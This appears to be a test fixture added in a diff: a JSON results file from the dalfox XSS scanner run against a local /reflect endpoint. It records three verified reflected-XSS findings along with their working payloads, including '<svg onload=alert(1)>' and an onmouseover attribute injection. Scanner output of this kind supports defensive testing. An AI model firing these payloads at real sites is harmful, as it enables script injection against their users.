@@ -1,0 +1,215 @@
+{
+  "informational_findings": [],
+  "injection_point_groups": [
+    {
+      "endpoint": "http://127.0.0.1:44655/reflect",
+      "entries": [
+        {
+          "entry_key": "bf78fd29e210af9a",
+          "finding_count": 1,
+          "findings": [
+            {
+              "confidence": "high",
+              "confidence_reason": "payload reached an executable position in the parsed response",
+              "cwe": "CWE-79",
+              "data": "http://127.0.0.1:44655/reflect?hist=1&x%20onmouseover%3Dalert%281%29%20class%3Ddlx0137987c%20=1",
+              "detection_method": "reflection",
+              "evidence": "DOM verification successful for param __dalfox_key_inject__ (DOM marker)",
+              "filter": {
+                "allowed": [
+                  "\"",
+                  "$",
+                  "'",
+                  "(",
+                  ")",
+                  "+",
+                  ",",
+                  "-",
+                  ".",
+                  "/",
+                  ":",
+                  ";",
+                  "<",
+                  "=",
+                  ">",
+                  "[",
+                  "\\",
+                  "]",
+                  "`",
+                  "{",
+                  "|",
+                  "}"
+                ],
+                "blocked": []
+              },
+              "inject_type": "inHTML",
+              "location": "Query",
+              "message_id": 606,
+              "message_str": "Triggered XSS Payload (DOM marker): __dalfox_key_inject__=x onmouseover=alert(1) class=dlx0137987c ",
+              "method": "GET",
+              "param": "__dalfox_key_inject__",
+              "payload": "x onmouseover=alert(1) class=dlx0137987c ",
+              "severity": "High",
+              "type": "V",
+              "type_description": "Vulnerable - dalfox asserts this input is exploitable; act on it"
+            }
+          ],
+          "first_seen": "2026-11-22T07:31:58.463192378+08:00",
+          "historical_hit_count": 1,
+          "last_confirmed": "2026-11-22T07:31:58.463192378+08:00",
+          "param": "__dalfox_key_inject__",
+          "verification_status": "verified"
+        },
+        {
+          "entry_key": "33af2d9da673fd4a",
+          "finding_count": 1,
+          "findings": [
+            {
+              "confidence": "high",
+              "confidence_reason": "payload reached an executable position in the parsed response",
+              "cwe": "CWE-79",
+              "data": "http://127.0.0.1:44655/reflect?hist=1&any=%3Csvg%20onload%3Dalert%281%29%20class%3Ddlx0137987c%3E",
+              "detection_method": "reflection",
+              "evidence": "DOM verification successful for param any (DOM marker)",
+              "filter": {
+                "allowed": [
+                  "\"",
+                  "$",
+                  "'",
+                  "(",
+                  ")",
+                  "+",
+                  ",",
+                  "-",
+                  ".",
+                  "/",
+                  ":",
+                  ";",
+                  "<",
+                  "=",
+                  ">",
+                  "[",
+                  "\\",
+                  "]",
+                  "`",
+                  "{",
+                  "|",
+                  "}"
+                ],
+                "blocked": []
+              },
+              "inject_type": "inHTML",
+              "location": "Query",
+              "message_id": 606,
+              "message_str": "Triggered XSS Payload (DOM marker): any=<svg onload=alert(1) class=dlx0137987c>",
+              "method": "GET",
+              "param": "any",
+              "payload": "<svg onload=alert(1) class=dlx0137987c>",
+              "severity": "High",
+              "type": "V",
+              "type_description": "Vulnerable - dalfox asserts this input is exploitable; act on it"
+            }
+          ],
+          "first_seen": "2026-11-22T07:31:58.463247969+08:00",
+          "historical_hit_count": 1,
+          "last_confirmed": "2026-11-22T07:31:58.463247969+08:00",
+          "param": "any",
+          "verification_status": "verified"
+        },
+        {
+          "entry_key": "0b55ded16bcfbe11",
+          "finding_count": 1,
+          "findings": [
+            {
+              "confidence": "high",
+              "confidence_reason": "payload reached an executable position in the parsed response",
+              "cwe": "CWE-79",
+              "data": "http://127.0.0.1:44655/reflect?hist=%3Csvg%20onload%3Dalert%281%29%20class%3Ddlx0137987c%3E",
+              "detection_method": "reflection",
+              "evidence": "DOM verification successful for param hist (DOM marker)",
+              "filter": {
+                "allowed": [
+                  "\"",
+                  "$",
+                  "'",
+                  "(",
+                  ")",
+                  "+",
+                  ",",
+                  "-",
+                  ".",
+                  "/",
+                  ":",
+                  ";",
+                  "<",
+                  "=",
+                  ">",
+                  "[",
+                  "\\",
+                  "]",
+                  "`",
+                  "{",
+                  "|",
+                  "}"
+                ],
+                "blocked": []
+              },
+              "inject_type": "inHTML",
+              "location": "Query",
+              "message_id": 606,
+              "message_str": "Triggered XSS Payload (DOM marker): hist=<svg onload=alert(1) class=dlx0137987c>",
+              "method": "GET",
+              "param": "hist",
+              "payload": "<svg onload=alert(1) class=dlx0137987c>",
+              "severity": "High",
+              "type": "V",
+              "type_description": "Vulnerable - dalfox asserts this input is exploitable; act on it"
+            }
+          ],
+          "first_seen": "2026-11-22T07:31:58.463264789+08:00",
+          "historical_hit_count": 1,
+          "last_confirmed": "2026-11-22T07:31:58.463264789+08:00",
+          "param": "hist",
+          "verification_status": "verified"
+        }
+      ],
+      "entry_count": 3,
+      "group_id": "8f2d8aa2c49df060",
+      "location": "Query",
+      "suspected": 0,
+      "unverified": 0,
+      "verified": 3
+    }
+  ],
+  "meta": {
+    "dalfox_version": "3.3.0",
+    "dedup_mode": "exact",
+    "failed_requests": 0,
+    "findings_count": 3,
+    "grouping": {
+      "enabled": true,
+      "false_positive_rehits": 0,
+      "false_positive_suppressed": 0,
+      "grouping_file": "/home/wll/uid129/.tmp/dalfox-grouping-e2e-history-memory-902065-1795303918198823749.jsonl",
+      "injection_points": 1,
+      "parameter_entries": 3,
+      "raw_finding_count": 3,
+      "verified_entries": 3
+    },
+    "incomplete": false,
+    "scan_duration_ms": 231,
+    "target_summary": [
+      {
+        "findings_count": 3,
+        "method": "GET",
+        "status": "findings",
+        "target": "http://127.0.0.1:44655/reflect?hist=1"
+      }
+    ],
+    "targets": [
+      "http://127.0.0.1:44655/reflect?hist=1"
+    ],
+    "targets_deduplicated": 0,
+    "total_requests": 28
+  }
+}
